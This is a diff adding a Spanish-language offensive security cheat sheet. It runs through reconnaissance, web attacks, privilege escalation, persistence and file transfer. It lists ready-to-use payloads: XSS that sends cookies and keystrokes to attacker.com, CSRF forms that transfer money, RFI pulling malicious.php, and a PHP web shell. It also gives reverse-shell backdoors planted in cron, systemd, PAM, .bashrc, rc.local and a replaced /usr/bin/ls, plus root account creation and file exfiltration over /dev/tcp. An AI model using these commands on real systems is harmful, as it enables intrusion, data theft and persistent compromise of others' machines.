@@ -1,0 +1,1581 @@
+[+]------------------------------[ RECONOCIMIENTO ]------------------------------[+]
+
+[*] NMAP
+▶ Escaneo Completo (Puertos, servicios y detección agresiva):
+  nmap -p- -sS -sV -A $IP -oN targeted
+
+▶ Escaneo de Servicios (Scripts y versiones):
+  nmap -p- -sC -sV $IP --open -oN targeted -oX targetedXML
+
+▶ Escaneo de Vulnerabilidades (Scripts NSE vuln):
+  nmap -p- --script=vuln $IP -oN vulns
+
+▶ Escaneo Rápido (Puertos abiertos rápidamente):
+  nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $IP -oA allPorts
+
+▶ Versiones/Servicios (Análisis detallado de puertos):
+  nmap -sCV -p<puertos> $IP -oN targeted
+
+▶ Salida XML (Exportar en múltiples formatos):
+  nmap -sCV -p<puertos> $IP -oN targeted -oX targetedXML
+
+▶ Generar HTML (Convertir XML a HTML):
+  xsltproc targetedXML -o index.html
+
+▶ Escaneo UDP (Puertos UDP abiertos):
+  nmap -sU -p- --min-rate 5000 $IP
+
+▶ Escaneo de Vulnerabilidades NSE (Scripts específicos):
+  nmap --script vuln $IP -p<puertos>
+
+▶ Escaneo de Scripts Específicos (Ejemplo HTTP):
+  nmap --script=http-enum $IP -p80,443
+
+▶ Escaneo de Red (Descubrir hosts vivos):
+  nmap -sn 192.168.1.0/24
+
+▶ Detección de Sistema Operativo (Identificar OS):
+  nmap -O $IP
+
+▶ Escaneo Sigiloso SYN (Escaneo silencioso):
+  nmap -sS $IP
+
+▶ Escaneo de Versiones Agresivo (Máxima precisión):
+  nmap -sV --version-intensity 9 $IP
+
+▶ Escaneo con Evasión de Firewall/IDS (Evitar detección):
+  nmap -f -t 0 -n -Pn --data-length 200 -D RND:10 $IP
+
+▶ Escaneo Puertos Comunes (Puertos frecuentes):
+  nmap -p 21,22,23,80,443,445,3389 $IP -sV
+
+▶ Escaneo con Traceroute (Rastrear ruta):
+  nmap --traceroute -Pn $IP
+
+▶ Escaneo con Fragmentación (Evadir filtros):
+  nmap -sS -f --mtu 8 $IP
+
+[*] FEROXBUSTER
+▶ Enumeración de Directorios (Búsqueda de directorios y archivos):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -d 10 -t 200 -x php,txt,html,php.bak,bak,tar --status-codes 200,301,302
+
+▶ Escaneo Recursivo (Búsqueda en profundidad):
+  feroxbuster -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 5 -x php,html,txt -r
+
+▶ Manejo de Cookies (Autenticación con cookies):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --cookies "PHPSESSID=abc123; usuario=admin" --status-codes 200,403
+
+▶ Escaneo con Cabeceras (Personalizar headers):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Authorization: Bearer token123" -H "User-Agent: MiNavegador/1.0"
+
+▶ Filtrado por Tamaño (Excluir respuestas por bytes):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-size 1024
+
+▶ Escaneo con Proxy (Usar proxy local):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --proxy http://127.0.0.1:8080
+
+▶ Escaneo de API (Búsqueda en endpoints API):
+  feroxbuster -u $URL/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/api-words.txt -x json,xml -H "Content-Type: application/json"
+
+▶ Escaneo con Rate Limit (Controlar velocidad):
+  feroxbuster -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --rate-limit 50
+
+[*] GOBUSTER
+▶ Enumeración de Directorios (Búsqueda de directorios y archivos):
+  gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,txt,html,php.bak,bak,tar
+
+▶ Enumeración de Subdominios (Descubrir subdominios):
+  gobuster vhost -u http://<dominio> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 --append-domain -q
+
+▶ Solo Estado 200 (Filtrar respuestas válidas):
+  gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html -s 200
+
+▶ Agregar Barra (Forzar barra al final):
+  gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
+
+▶ Escaneo CGI-BIN (Búsqueda en CGI):
+  gobuster dir -u $URL/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x sh,pl,cgi
+
+▶ Escaneo con Autenticación (Usar credenciales):
+  gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -U usuario -P contraseña
+
+▶ Escaneo DNS (Bruteforce de subdominios):
+  gobuster dns -d <dominio.com> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+▶ Escaneo con Retraso (Evitar bloqueos):
+  gobuster dir -u $URL -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --delay 500ms
+
+[*] WFUZZ
+▶ Fuzzing Básico (Búsqueda de directorios):
+  wfuzz -c --sc=200,301 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $URL/FUZZ/
+
+▶ Mostrar Líneas (Filtrar por líneas):
+  wfuzz -c --sl=216 --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $URL/FUZZ/
+
+▶ Probar Extensiones (Fuzzing con extensiones):
+  wfuzz -c --hl=216 --hc=404,403 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z file,html-php-txt $URL/FUZZ.FUZ2Z
+
+▶ Rango de Números (Fuzzing numérico):
+  wfuzz -c -t 200 -z range,1-2000 $URL/FUZZ
+
+▶ Fuzzing de Parámetros (Probar parámetros POST):
+  wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -d "FUZZ=test" $URL
+
+▶ Fuzzing de Cookies (Probar valores de cookies):
+  wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b "session=FUZZ" $URL
+
+▶ Fuzzing con Proxy (Usar proxy local):
+  wfuzz -c --sc=200 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -p 127.0.0.1:8080 $URL/FUZZ/
+
+[*] FFUF
+▶ Escaneo Básico (Búsqueda de directorios):
+  ffuf -c -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $URL/FUZZ --mc=200,301
+
+▶ Fuzzing de Subdominios (Descubrir subdominios):
+  ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<dominio.com>
+
+▶ Fuzzing Recursivo (Búsqueda en profundidad):
+  ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $URL/FUZZ -recursion -recursion-depth 2
+
+▶ Fuzzing con Proxy (Usar proxy local):
+  ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $URL/FUZZ -x http://127.0.0.1:8080
+
+▶ Fuzzing con Cabeceras (Personalizar headers):
+  ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u $URL/FUZZ -H "User-Agent: MiNavegador/1.0"
+
+[*] DIRB
+▶ Escaneo Simple Test (Prueba rápida sin diccionario externo):
+  dirb $URL
+
+▶ Escaneo Básico (Búsqueda de directorios):
+  dirb $URL /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+▶ Escaneo con Extensiones (Probar extensiones):
+  dirb $URL /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -X .php,.html,.txt
+
+▶ Escaneo Silencioso (Sin salida innecesaria):
+  dirb $URL /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -S
+
+▶ Escaneo con Diccionario Propio (Usar wordlist integrada):
+  dirb $URL /usr/share/dirb/wordlists/common.txt
+
+[*] NIKTO
+▶ Escaneo Básico (Análisis de servidor web):
+  nikto -h $URL
+
+▶ Escaneo con Autenticación (Usar credenciales):
+  nikto -h $URL -id admin:password
+
+▶ Escaneo con Plugin Específico (Ejemplo XSS):
+  nikto -h $URL -Plugins "apache_expect_xss"
+
+▶ Escaneo con Proxy (Usar proxy local):
+  nikto -h $URL -useproxy http://127.0.0.1:8080
+
+[*] NETDISCOVER
+▶ Reconocimiento de Host (Descubrir dispositivos en red):
+  netdiscover -r 192.168.1.0/24
+
+▶ Modo Pasivo (Escuchar sin enviar paquetes):
+  netdiscover -P -i eth0
+
+▶ Escaneo Rápido (Acelerado):
+  netdiscover -f -r 192.168.1.0/24
+
+[*] ARP-SCAN
+▶ Reconocimiento de Host (Escaneo ARP local):
+  arp-scan -I eth0 --ignoredups --localnet # se simplifica -lg
+
+▶ Salida Detallada (Información extendida):
+  arp-scan -l -v
+
+▶ Escaneo Específico (Rango personalizado):
+  arp-scan 192.168.1.1-192.168.1.254
+
+[+]------------------------------[ ATAQUES WEB ]------------------------------[+]
+
+[*] WPSCAN (WORDPRESS)
+▶ Escaneo Básico (Reconocimiento inicial):
+  wpscan --url $URL -e vp,u --random-user-agent --api-token="$API_TOKEN"
+
+▶ Fuerza Bruta (Ataque de contraseñas):
+  wpscan --url $URL -U admin -P /usr/share/wordlists/rockyou.txt
+
+▶ Enumeración de Usuarios (Listar usuarios):
+  wpscan --url $URL --enumerate u
+
+▶ Detección de Plugins Vulnerables (Buscar plugins inseguros):
+  wpscan --url $URL --enumerate vp
+
+▶ Escaneo Agresivo (Análisis exhaustivo):
+  wpscan --url $URL --enumerate vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --api-token="$API_TOKEN"
+
+▶ Detección de Temas (Identificar temas):
+  wpscan --url $URL --enumerate vt
+
+▶ Escaneo de Vulnerabilidades en Medios (Buscar fallos en medios):
+  wpscan --url $URL --enumerate m
+
+▶ Fuerza Bruta con Lista de Usuarios (Probar múltiples credenciales):
+  wpscan --url $URL -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
+
+▶ Escaneo con Proxy (Usar proxy local):
+  wpscan --url $URL --proxy http://127.0.0.1:8080 --enumerate vp
+
+▶ Escaneo con Salida (Guardar resultados):
+  wpscan --url $URL -e vp,u --output wpscan_results.txt
+
+# Notas:
+# - Descomprimir rockyou.txt si está comprimido: gunzip /usr/share/wordlists/rockyou.txt.gz
+# - Usa un API token válido para acceder a la base de datos de vulnerabilidades.
+
+[*] NUCLEI
+▶ Enumerar Plugins en WordPress (Detectar plugins específicos):
+  nuclei -u $URL -tags cms -t /usr/share/nuclei-templates/http/cms/wordpress-detect.yaml
+
+▶ Detectar Vulnerabilidades Comunes (CVE críticas y altas):
+  nuclei -u $URL -tags cve -severity critical,high -o resultados.txt
+
+▶ Escanear Directorios Expuestos (Buscar configuraciones expuestas):
+  nuclei -u $URL -tags exposure,config
+
+▶ Buscar Paneles de Login (Identificar páginas de acceso):
+  nuclei -u $URL -tags login
+
+▶ Detectar Tecnologías Web (Identificar tecnologías):
+  nuclei -u $URL -tags tech
+
+▶ Buscar Vulnerabilidades SQLi (Detección de inyecciones SQL):
+  nuclei -u $URL -tags sqli
+
+▶ Escanear Vulnerabilidades XSS (Detección de scripts cruzados):
+  nuclei -u $URL -tags xss
+
+▶ Detectar Archivos de Backup (Buscar copias expuestas):
+  nuclei -u $URL -tags backup
+
+▶ Buscar Información Sensible Expuesta (Datos filtrados):
+  nuclei -u $URL -tags exposure
+
+▶ Escanear Vulnerabilidades de CMS (Fallos en sistemas CMS):
+  nuclei -u $URL -tags cms
+
+▶ Escaneo Masivo (Analizar múltiples URLs):
+  nuclei -l urls.txt -tags cve -silent
+
+[*] SQLMAP
+▶ Escaneo Global (Analizar solicitud guardada):
+  sqlmap -r pwned.txt --dump --batch
+
+▶ Descubrir DBs (Listar bases de datos):
+  sqlmap -u "$URL/pagina.php" --dbs
+
+▶ Descubrir Tablas (Listar tablas de una DB):
+  sqlmap -u "$URL/pagina.php" -D nombre_db --tables
+
+▶ Volcar Tabla (Extraer datos de una tabla):
+  sqlmap -u "$URL/pagina.php" -D nombre_db -T nombre_tabla --dump
+
+▶ Volcar Columnas Específicas (Extraer campos específicos):
+  sqlmap -u "$URL/pagina.php" -D nombre_db -T nombre_tabla -C usuario,contraseña --dump
+
+▶ Con Cookies (Usar cookies para autenticación):
+  sqlmap -u "$URL/pagina.php" --cookie "PHPSESSID=1234567890abcdef" --dbs
+
+▶ Shell Inversa (Obtener shell remota):
+  sqlmap -u "$URL/dashboard.php?search=any" --cookie="PHPSESSID=1234567890abcdef" --os-shell
+
+▶ Inyección Ciega (Explotación sin respuesta visible):
+  sqlmap -u "$URL/pagina.php" --data="id=1" --technique=B
+
+▶ Inyección en Cabeceras (Atacar vía headers):
+  sqlmap -u "$URL/pagina.php" --headers="X-Forwarded-For: *"
+
+▶ Evasión de WAF (Evadir filtros de seguridad):
+  sqlmap -u "$URL/pagina.php" --tamper=space2comment --level 3
+
+▶ Explotación de Tiempo (Ataque basado en retrasos):
+  sqlmap -u "$URL/pagina.php" --technique=T
+
+▶ Lectura de Archivos (Acceder a archivos locales):
+  sqlmap -u "$URL/pagina.php" --file-read="/etc/passwd"
+
+▶ Escritura de Archivos (Subir archivo al servidor):
+  sqlmap -u "$URL/pagina.php" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+▶ Ejecución de Comandos (Ejecutar comandos del sistema):
+  sqlmap -u "$URL/pagina.php" --os-cmd="whoami"
+
+▶ Escaneo Masivo (Analizar múltiples URLs):
+  sqlmap -m urls.txt --batch --random-agent
+
+▶ Escaneo con POST (Probar datos POST):
+  sqlmap -u $URL --data "username=admin&password=test" --dbs
+
+[*] XSS (Cross-Site Scripting)
+▶ Prueba Básica (Probar alerta simple):
+  <script>alert('XSS')</script>
+
+▶ Robo de Cookies (Enviar cookies al atacante):
+  <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+
+▶ Keylogger (Registrar teclas presionadas):
+  <script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key=' + e.key) }</script>
+
+▶ Evasión de Filtros (Evadir detección básica):
+  <img src=x onerror=alert('XSS')>
+
+▶ Evasión con SVG (Usar SVG para ejecutar):
+  <svg/onload=alert('XSS')>
+
+▶ XSS Almacenado (Persistir ataque):
+  <script>new Image().src="http://attacker.com/steal?cookie="+document.cookie;</script>
+
+▶ XSS Reflejado (Inyectar en URL):
+  http://ejemplo.com/search?q=<script>alert('XSS')</script>
+
+▶ XSS basado en DOM (Manipular DOM):
+  <script>document.write("<script>alert('XSS')</script>");</script>
+
+▶ XSS en Atributos (Ejecutar en eventos):
+  <body onload=alert('XSS')>
+
+▶ XSS en JavaScript (Inyectar en código JS):
+  ';alert('XSS');//
+
+▶ XSS Polyglot (Funcionan en múltiples contextos):
+  <script>/*<![CDATA[*/alert(1)/*]]>*/</script>
+
+[*] CSRF (Cross-Site Request Forgery)
+▶ Formulario Malicioso (Engañar al usuario):
+  <form action="http://banco.com/transferir" method="POST">
+    <input type="hidden" name="destinatario" value="atacante">
+    <input type="hidden" name="cantidad" value="1000">
+    <input type="submit" value="¡Gana un premio!">
+  </form>
+
+▶ Petición Automática (Ejecutar con imagen):
+  <img src="http://banco.com/transferir?destinatario=atacante&cantidad=1000" style="display:none" />
+
+▶ CSRF con XMLHttpRequest (Petición POST dinámica):
+  <script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://banco.com/transferir", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("destinatario=atacante&cantidad=1000");
+  </script>
+
+▶ CSRF con Fetch API (Petición moderna):
+  <script>
+    fetch('http://banco.com/transferir', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: 'destinatario=atacante&cantidad=1000'
+    });
+  </script>
+
+▶ CSRF con Autoenvío (Enviar formulario automáticamente):
+  <form action="http://banco.com/transferir" method="POST" id="csrf">
+    <input type="hidden" name="destinatario" value="atacante">
+    <input type="hidden" name="cantidad" value="1000">
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+
+[*] LFI (Local File Inclusion)
+▶ Lectura de Archivos del Sistema (Acceder a archivos locales):
+  http://ejemplo.com/index.php?page=../../../etc/passwd
+
+▶ Evasión de Filtros (Evadir restricciones de ruta):
+  http://ejemplo.com/index.php?page=....//....//....//etc/passwd
+
+▶ Uso de Wrappers (Leer codificado en Base64):
+  http://ejemplo.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
+
+▶ Uso de Null Byte (Bypass en PHP < 5.3.4):
+  http://ejemplo.com/index.php?page=../../../etc/passwd%00
+
+▶ LFI en Windows (Acceder a archivos de Windows):
+  http://ejemplo.com/index.php?page=../../../windows/win.ini
+
+▶ LFI con POST (Inyectar código vía POST):
+  http://ejemplo.com/index.php?page=php://input  # POST: <?php system('id'); ?>
+
+[*] RFI (Remote File Inclusion)
+▶ Inclusión de Archivo Remoto (Ejecutar script remoto):
+  http://ejemplo.com/index.php?page=http://attacker.com/malicious.php
+
+▶ Ejecución de Código Remoto (Inyectar código Base64):
+  http://ejemplo.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+
+▶ Uso de Wrappers (Ejecutar comandos con expect):
+  http://ejemplo.com/index.php?page=expect://ls
+
+▶ Inclusión desde FTP (Cargar desde servidor FTP):
+  http://ejemplo.com/index.php?page=ftp://attacker.com/malicious.php
+
+▶ Inclusión desde SMB (Cargar desde recurso compartido):
+  http://ejemplo.com/index.php?page=\\attacker.com\share\malicious.php
+
+[*] File Upload Vulnerabilities
+▶ Common File Extensions:
+  # PHP
+  PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+  # Working in PHPv8
+  PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
+  # ASP
+  ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+  # JSP
+  JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+  # Coldfusion
+  Coldfusion: .cfm, .cfml, .cfc, .dbm
+  # Flash
+  Flash: .swf
+  # Perl
+  Perl: .pl, .cgi
+
+▶ Payload PHP ejecución de comandos:
+  <?php system($_GET['cmd']); ?>  # Guardar como shell.php
+
+▶ Bypass con Doble Extensión:
+  shell.php.jpg
+
+[+]------------------------------[ POST-EXPLOTACIÓN ]------------------------------[+]
+
+[*] ESCALADA DE PRIVILEGIOS
+▶ Buscar Archivos SUID (Encontrar binarios con permisos SUID):
+  find / -perm -4000 2>/dev/null
+
+▶ Buscar Archivos Escribibles (Listar archivos modificables):
+  find / -writable -type f 2>/dev/null
+
+▶ Buscar por Nombre (Localizar archivo específico):
+  find / -name "<nombre_a_buscar>" 2>/dev/null
+
+▶ Buscar Archivos Ocultos (Detectar archivos ocultos):
+  find / -name ".*" -type f 2>/dev/null
+
+▶ Búsqueda Múltiple (Buscar varios tipos de archivos):
+  find / -name "*.zip" -o -name "*.tar" 2>/dev/null
+
+▶ Buscar Capacidades (Listar binarios con capacidades):
+  getcap -r / 2>/dev/null
+
+▶ Monitoreo en Tiempo Real (Observar cambios en archivo):
+  watch -n 1 "ls -l /bin/bash"
+
+▶ Listar Tareas Cron (Verificar tareas programadas):
+  cat /etc/crontab
+  ls -l /etc/cron.* 2>/dev/null
+
+▶ Verificar Sudoers (Comprobar permisos sudo):
+  sudo -l
+
+▶ Explotar Kernel (Buscar vulnerabilidades del kernel):
+  uname -a
+  searchsploit "<versión_kernel>"
+
+▶ Escalar con Sudo (Aprovechar comandos permitidos):
+  sudo -l
+  # Ejemplo: si permite 'vi', usa: sudo vi -c ':!/bin/sh'
+
+▶ Escalar con SUID (Ejecutar shell desde SUID):
+  find / -perm -u=s -type f 2>/dev/null
+  # Ejemplo: si encuentras '/usr/bin/find', usa: /usr/bin/find . -exec /bin/sh \;
+
+▶ Escalar con Capabilities (Usar capacidades para root):
+  getcap -r / 2>/dev/null
+  # Ejemplo: si 'setcap cap_setuid+ep /bin/bash', usa: /bin/bash -p
+
+▶ Escalar con Path Hijacking (Sobrescribir PATH):
+  echo '#!/bin/bash\n/bin/sh' > /tmp/ls
+  chmod +x /tmp/ls
+  export PATH=/tmp:$PATH
+  # Ejecuta un comando que use 'ls' (e.g., 'ls -l')
+
+▶ Escalar con Wildcard (Explotar wildcards en comandos):
+  echo '#!/bin/sh\nbash' > shell.sh
+  chmod +x shell.sh
+  touch -- "--checkpoint=1"
+  touch -- "--checkpoint-action=exec=sh shell.sh"
+  # Ejecuta un comando como 'tar' que use wildcards (e.g., 'tar -cf test.tar *')
+
+▶ Escalar con NFS (Montar sistema de archivos remoto):
+  showmount -e $IP
+  mkdir /tmp/mountme
+  mount -o rw,vers=2 $IP:/ /tmp/mountme
+  # Edita /tmp/mountme/etc/passwd si es escribible
+
+▶ Escalar con Docker (Escapar a host desde contenedor):
+  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+▶ Escalar con LXD (Montar sistema raíz en contenedor):
+  lxc init ubuntu:16.04 test -c security.privileged=true
+  lxc config device add test mydevice disk source=/ path=/mnt/root recursive=true
+  lxc start test
+  lxc exec test /bin/bash
+
+▶ Verificar /etc/passwd Escribible (Añadir usuario root):
+  ls -l /etc/passwd
+  # Si es escribible: echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd
+
+▶ Escalar con Misconfiguración de Servicio (Ejemplo systemctl):
+  systemctl edit system-backup.service
+  # Añade: ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'
+
+[*] PERSISTENCIA
+▶ Crear Usuario (Añadir usuario al sistema):
+  useradd -m -s /bin/bash hacker
+  echo "hacker:password" | chpasswd
+
+▶ Agregar a Sudoers (Dar privilegios sudo):
+  echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
+
+▶ Crear Tarea Cron (Ejecutar backdoor periódicamente):
+  echo "* * * * * root bash -i >& /dev/tcp/$IP/4444 0>&1" > /etc/cron.d/backdoor
+
+▶ Backdoor SSH (Permitir acceso remoto):
+  echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+  echo "<clave_pública_atacante>" >> /root/.ssh/authorized_keys
+  service ssh restart
+
+▶ Backdoor en .bashrc (Ejecutar al iniciar sesión):
+  echo "bash -i >& /dev/tcp/$IP/4444 0>&1 &" >> ~/.bashrc
+
+▶ Crear Servicio Systemd (Persistencia con servicio):
+  echo "[Unit]
+  Description=Mi Backdoor
+  [Service]
+  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'
+  Restart=always
+  [Install]
+  WantedBy=multi-user.target" > /etc/systemd/system/backdoor.service
+  systemctl enable backdoor.service
+  systemctl start backdoor.service
+
+▶ Backdoor en PAM (Ejecutar al autenticar):
+  echospre '#!/bin/bash\nbash -i >& /dev/tcp/$IP/4444 0>&1' > /usr/local/bin/backdoor.sh
+  chmod +x /usr/local/bin/backdoor.sh
+  echo "auth optional pam_exec.so /usr/local/bin/backdoor.sh" >> /etc/pam.d/common-auth
+
+▶ Persistencia con rc.local (Ejecutar al iniciar):
+  echo "/bin/bash -i >& /dev/tcp/$IP/4444 0>&1 &" >> /etc/rc.local
+
+▶ Backdoor en Binario Existente (Modificar binario común):
+  echo '#!/bin/bash\nbash -i >& /dev/tcp/$IP/4444 0>&1 &' > /usr/bin/ls
+  chmod +x /usr/bin/ls
+
+  # Notas:
+  # - Sustituye $IP por la IP del atacante donde se escucha la conexión (e.g., con 'nc -l 4444').
+  # - Asegúrate de tener permisos suficientes para modificar archivos del sistema.
+
+[+]------------------------------[ TRANSFERENCIA DE ARCHIVOS ]------------------------------[+]
+
+[*] FTP
+▶ Conectar (Iniciar sesión en servidor FTP):
+  ftp $IP
+
+▶ Escaneo FTP con Nmap (Probar scripts FTP):
+  nmap --script ftp-* -p 21 $IP
+
+▶ FTP Anónimo (Acceso sin credenciales):
+  ftp://anonymous:anonymous@$IP
+
+▶ Descargar Todo con wget (Copiar contenido recursivo):
+  wget -r ftp://$IP
+  wget -m ftp://anonymous:anonymous@$IP
+  wget -m --no-passive ftp://anonymous:anonymous@$IP
+
+▶ Subir Archivo (Enviar archivo al servidor):
+  ftp> put archivo.txt
+
+▶ Descargar Archivo (Obtener archivo del servidor):
+  ftp> get archivo.txt
+
+▶ Listar Directorios (Ver contenido del directorio):
+  ftp> ls
+
+▶ Cambiar Directorio (Navegar en el servidor):
+  ftp> cd /ruta/al/directorio
+
+▶ Modo Binario (Transferencia de archivos binarios):
+  ftp> binary
+
+▶ Modo ASCII (Transferencia de archivos de texto):
+  ftp> ascii
+
+[*] COMPARTIENDO ARCHIVOS
+▶ Víctima a Atacante usando CAT (Enviar archivo por TCP):
+  [Atacante] nc -nlvp 443 > archivo_recibido
+  [Víctima] cat archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima usando CAT (Recibir archivo por TCP):
+  [Atacante] nc -nlvp 443 < archivo_a_compartir
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 > archivo_recibido
+
+▶ Víctima a Atacante con BASH (Enviar archivo con descriptor):
+  [Víctima] bash -c "exec 3<> /dev/tcp/$IP_ATACANTE/443; cat archivo_a_compartir >&3"
+  [Atacante] nc -nlvp 443 > archivo_recibido
+
+▶ Atacante a Víctima con BASH (Recibir archivo con descriptor):
+  [Atacante] nc -nlvp 443 < archivo_a_compartir
+  [Víctima] bash -c "exec 3<> /dev/tcp/$IP_ATACANTE/443; cat <&3 > archivo_recibido"
+
+▶ Víctima a Atacante con TAR (Enviar archivo comprimido):
+  [Atacante] nc -nlvp 443 | tar -xvf -
+  [Víctima] tar -cvf - archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con TAR (Recibir archivo comprimido):
+  [Atacante] tar -cvf - archivo_a_compartir | nc -nlvp 443
+  [Víctima] tar -xvf - < /dev/tcp/$IP_ATACANTE/443
+
+▶ Víctima a Atacante con Base64 (Enviar codificado):
+  [Atacante] nc -nlvp 443 | base64 -d > archivo_recibido
+  [Víctima] base64 archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con Base64 (Recibir codificado):
+  [Atacante] base64 archivo_a_compartir | nc -nlvp 443
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 | base64 -d > archivo_recibido
+
+▶ Víctima a Atacante con Gzip (Enviar comprimido):
+  [Atacante] nc -nlvp 443 | gzip -d > archivo_recibido
+  [Víctima] gzip -c archivo_a_compartir > /dev/tcp/$IP_ATACANTE/443
+
+▶ Atacante a Víctima con Gzip (Recibir comprimido):
+  [Atacante] gzip -c archivo_a_compartir | nc -nlvp 443
+  [Víctima] cat < /dev/tcp/$IP_ATACANTE/443 | gzip -d > archivo_recibido
+
+[*] SCP (SECURE COPY)
+▶ Copiar Archivo Local a Remoto (Subir archivo):
+  scp archivo.txt usuario@$IP:/ruta/destino/
+
+▶ Copiar Archivo Remoto a Local (Descargar archivo):
+  scp usuario@$IP:/ruta/archivo.txt /ruta/local/
+
+▶ Copiar Directorio Completo (Transferir directorio recursivo):
+  scp -r /ruta/local/directorio usuario@$IP:/ruta/destino/
+
+▶ Copiar con Puerto Específico (Usar puerto personalizado):
+  scp -P 2222 archivo.txt usuario@$IP:/ruta/destino/
+
+▶ Copiar Preservando Permisos (Mantener atributos):
+  scp -p archivo.txt usuario@$IP:/ruta/destino/
+
+▶ Copiar con Compresión (Reducir tamaño en transferencia):
+  scp -C archivo.txt usuario@$IP:/ruta/destino/
+
+[*] WGET
+▶ Descargar Archivo (Obtener archivo desde URL):
+  wget $URL/archivo.txt
+
+▶ Descargar y Renombrar (Guardar con nombre personalizado):
+  wget -O nuevo_nombre.txt $URL/archivo.txt
+
+▶ Descargar Recursivamente (Copiar sitio completo):
+  wget -r $URL/
+
+▶ Descargar con Autenticación (Acceso protegido):
+  wget --user=usuario --password=contraseña $URL/archivo_protegido.txt
+
+▶ Limitar Velocidad de Descarga (Controlar ancho de banda):
+  wget --limit-rate=200k $URL/archivo_grande.zip
+
+▶ Continuar Descarga Interrumpida (Reanudar transferencia):
+  wget -c $URL/archivo_grande.zip
+
+[*] CURL
+▶ Descargar Archivo (Obtener archivo desde URL):
+  curl -O $URL/archivo.txt
+
+▶ Enviar Datos POST (Hacer solicitud POST):
+  curl -X POST -d "param1=valor1&param2=valor2" $URL/api
+
+▶ Descargar con Autenticación (Acceso protegido):
+  curl -u usuario:contraseña $URL/archivo_protegido.txt
+
+▶ Seguir Redirecciones (Manejar redirecciones):
+  curl -L $URL/redireccion
+
+▶ Usar Proxy (Transferencia a través de proxy):
+  curl -x socks5://127.0.0.1:9150 $URL
+
+▶ Verificar Certificado SSL (Inspeccionar conexión segura):
+  curl -v https://$URL
+
